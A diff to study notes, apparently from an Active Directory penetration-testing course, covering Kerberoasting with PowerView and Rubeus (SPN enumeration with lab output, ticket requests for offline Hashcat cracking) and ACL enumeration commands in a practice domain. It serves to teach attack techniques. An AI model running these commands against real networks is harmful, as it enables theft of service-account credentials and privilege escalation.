@@ -1545,18 +1545,23 @@ Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows 
 ## Enumerate SPN Accounts (PowerView)
 
 ```powershell
-PS C:\htb> Import-Module .\PowerView.ps1
-PS C:\htb> Get-DomainUser * -spn | select samaccountname
+ Get-DomainUser * -spn | select samaccountname,serviceprincipalname
 
-samaccountname
---------------
-adfs
-backupagent
-krbtgt
-sqldev
-sqlprod
-sqlqa
-solarwindsmonitor
+samaccountname    serviceprincipalname
+--------------    --------------------
+adfs              adfsconnect/azure01.inlanefreight.local
+backupagent       backupjob/veam001.inlanefreight.local
+certsvc           http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
+krbtgt            kadmin/changepw
+damundsen         {MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433, MSSQL/ACADEMY-EA-FILE}
+sqldev            MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+sqlprod           MSSQLSvc/SPSJDB.inlanefreight.local:1433
+sqlqa             MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
+SAPService        SAPService/srv01.inlanefreight.local
+solarwindsmonitor sts/inlanefreight.local
+testspn           testspn/kerberoast.inlanefreight.local
+testspn2          testspn2/kerberoast.inlanefreight.local
+svc_vmwaresso     vmware/inlanefreight.local
 ```
 
 ## Target Specific User (PowerView)
@@ -1621,7 +1626,7 @@ PS C:\htb> .\Rubeus.exe kerberoast /stats
 
 Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat.
 
-Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.
+Per the documentation, the `/nowrap` flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.
 
 
 ```powershell
@@ -1855,6 +1860,18 @@ InheritedObjectAceType : All
 OpaqueLength           : 0
 
 <SNIP>
+```
+
+## alternative 
+
+```powershell
+PS C:\Tools> Get-DomainObjectAcl "GPO Management" -ResolveGUIDs | ? SecurityIdentifier -eq $forend
+```
+
+Grep like command : `sls'
+
+```powershell
+PS C:\Tools> Get-DomainObjectAcl "GPO Management" -ResolveGUIDs | sls (Convert-NameToSid forend)
 ```
 
 ## BloodHound
